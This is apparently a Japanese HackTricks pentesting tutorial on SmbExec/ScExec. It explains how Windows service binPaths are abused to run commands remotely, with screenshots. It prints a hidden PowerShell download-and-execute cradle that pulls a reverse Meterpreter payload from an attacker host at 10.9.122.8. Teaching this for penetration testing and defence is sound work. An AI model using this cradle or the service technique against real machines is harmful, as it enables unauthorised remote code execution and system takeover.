# SmbExec/ScExec

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社**で働いていますか？**HackTricksに会社の広告を掲載**したいですか？または、**PEASSの最新バージョンにアクセス**したり、**HackTricksをPDFでダウンロード**したいですか？[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをご覧ください。
* [**公式のPEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手してください。
* **[**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**に**フォロー**してください。**
* **ハッキングのコツを共有するために、**[**hacktricksリポジトリ**](https://github.com/carlospolop/hacktricks)と[**hacktricks-cloudリポジトリ**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください。**

</details>

## 動作原理

**SmbexecはPsexecのように機能します。** この例では、被害者内の悪意のある実行可能ファイルへの"_binpath_"を指定する**代わりに**、**cmd.exeまたはpowershell.exe**を指し、それらのいずれかがバックドアをダウンロードして実行します。

## **SMBExec**

攻撃者とターゲットの側から見たsmbexecが実行されるときの様子を見てみましょう：

![](../../.gitbook/assets/smbexec\_prompt.png)

サービス"BTOBTO"が作成されることがわかります。しかし、`sc query`を実行したときにターゲットマシンにそのサービスは存在しません。システムログが何が起こったのかの手がかりを明らかにします：

![](../../.gitbook/assets/smbexec\_service.png)

サービスファイル名には、実行するコマンド文字列が含まれています（%COMSPEC%はcmd.exeの絶対パスを指します）。実行するコマンドをbatファイルにエコーし、stdoutとstderrをTempファイルにリダイレクトし、batファイルを実行して削除します。Kaliに戻ると、PythonスクリプトがSMB経由で出力ファイルを引き出し、私たちの"擬似シェル"に内容を表示します。私たちが"シェル"に入力する各コマンドについて、新しいサービスが作成され、プロセスが繰り返されます。これにより、バイナリをドロップする必要がなく、望む各コマンドを新しいサービスとして実行するだけです。間違いなくよりステルス性が高いですが、実行された各コマンドに対してイベントログが作成されることを見ました。それでも、対話型でない"シェル"を取得する非常に巧妙な方法です！

## 手動SMBExec

**またはサービスを介してコマンドを実行する**

smbexecが示したように、バイナリが必要なくても、サービスbinPathsから直接コマンドを実行することが可能です。これは、ターゲットWindowsマシンで任意のコマンドを実行する必要がある場合に覚えておくと便利なトリックです。簡単な例として、バイナリなしでリモートサービスを使用してMeterpreterシェルを取得しましょう。

Metasploitの`web_delivery`モジュールを使用し、リバースMeterpreterペイロードを持つPowerShellターゲットを選択します。リスナーが設定され、ターゲットマシンで実行するコマンドを教えてくれます：
```
powershell.exe -nop -w hidden -c $k=new-object net.webclient;$k.proxy=[Net.WebRequest]::GetSystemWebProxy();$k.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $k.downloadstring('http://10.9.122.8:8080/AZPLhG9txdFhS9n');
```
```markdown
Windows攻撃ボックスから、リモートサービス（"metpsh"）を作成し、binPathを設定してcmd.exeをペイロードと共に実行します：

![](../../.gitbook/assets/sc\_psh\_create.png)

そして、それを起動します：

![](../../.gitbook/assets/sc\_psh\_start.png)

サービスが応答しないためエラーが発生しますが、Metasploitリスナーを見ると、コールバックが行われ、ペイロードが実行されたことがわかります。

すべての情報はここから抽出されました： [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社**で働いていますか？ **HackTricksにあなたの会社を広告したいですか？** または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロードしたいですか？** [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見してください。私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションです。
* [**公式のPEASS & HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* **[**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**にフォローしてください。**
* **ハッキングのトリックを共有するために、** [**hacktricksリポジトリ**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloudリポジトリ**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出してください。**

</details>
```
